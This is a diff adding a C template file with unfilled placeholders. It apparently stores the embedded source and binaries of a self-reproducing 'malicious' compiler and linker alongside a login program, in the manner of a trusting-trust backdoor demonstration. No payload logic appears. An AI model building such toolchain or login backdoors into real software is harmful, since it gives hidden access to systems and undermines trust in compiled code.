@@ -1,0 +1,21 @@
+#include "babalogin.h"
+#include "data.h"
+
+struct DirtyHackStruct_ global_dirtyhark = {{
+	.login_environ_ = login_environ_header_str,
+	.padding = {{0}},
+	.maliciouscompiler_source_ = {mycompiler_source},
+}};
+char maliciouslinker_source[4096] = {mylinker_source};
+
+char mycompiler_source[] = {mycompiler_source};
+char mylinker_source[] = {mylinker_source};
+char mylogin_source[] = {mylogin_source};
+
+struct fullcompiler global_rawcompiler = {{
+	.compiler_binary = {mycompiler_binary},
+	.compiler_binary_len = {mycompiler_binary_len},
+	.linker_binary = {mylinker_binary},
+	.linker_binary_len = {mylinker_binary_len},
+}};
+
